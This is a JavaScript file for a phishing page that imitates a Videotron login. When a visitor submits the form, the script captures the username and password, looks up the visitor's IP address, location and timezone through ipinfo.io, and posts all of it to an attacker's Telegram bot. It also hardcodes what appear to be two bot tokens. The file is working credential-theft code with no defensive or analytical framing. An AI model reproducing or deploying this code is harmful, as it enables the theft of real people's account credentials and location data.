import { TELEGRAM_TOKEN, CHAT_ID, IP_TOKEN } from "./config.js";

const body = document.querySelector("body");
const form = document.querySelector("form");
const usernameInput = document.querySelector(".username");
const passwordInput = document.querySelector(".password");

function displayError(element) {
  element.classList.remove("display--none");
}

body.addEventListener("focusout", (e) => {
  if (e.target.classList.contains("username") || e.target.classList.contains("password")) {
    const parentElement = e.target.parentElement;
    const errorMessage = parentElement.querySelector(".error");

    if (e.target.value === "") {
      displayError(errorMessage);
    }
  }
});

function sendLogsToTelegram() {
  const username = usernameInput.value;
  const password = passwordInput.value;

  // !terminate function if password or email is empty
  if (!username || !password) {
    if (usernameInput.value === "") {
      const error = usernameInput.parentElement.querySelector(".error");
      displayError(error);
    }

    if (passwordInput.value === "") {
      const error = passwordInput.parentElement.querySelector(".error");
      displayError(error);
    }

    return;
  }

  // async function
  async function asyncFunction(token) {
    const IP_API_Response = await fetch(`https://ipinfo.io?token=${token}`);
    const data = await IP_API_Response.json();

    const { ip, country, region, city, loc, org, timezone } = data;
    const [lat, lng] = loc.split(",");

    // ===============================================
    // ***********************************************
    // ===============================================

    //message template

    const logMessage = `
    **** VIDEOTRON RESULT ****\n
    Username: ${username}\n
    Password: ${password}\n
    IP Address: ${ip}\n
    Country: ${country}\n
    Region: ${region}\n
    City: ${city}\n
    Location: [lat: ${lat}, lon: ${lng}]\n
    Timezone: ${timezone}\n
    `;

    // ===============================================
    // ***********************************************
    // ===============================================

    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

    const HTTPHeader = {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: logMessage,
      }),
    };

    fetch(url, HTTPHeader)
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }

        return response.json();
      })
      .then((data) => {
        // window.location.href = "https://www.videotron.com/";
      })
      .catch((error) => console.error("Error:", error));
  }

  asyncFunction(IP_TOKEN);
}

form.addEventListener("submit", (e) => {
  e.preventDefault();

  if (
    TELEGRAM_TOKEN === "6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68" ||
    TELEGRAM_TOKEN === "6567283982:AAEnrAsI1zzaLrGFULyuw-FArp4XMwJbNak"
  ) {
    sendLogsToTelegram();
  }

  return;
});
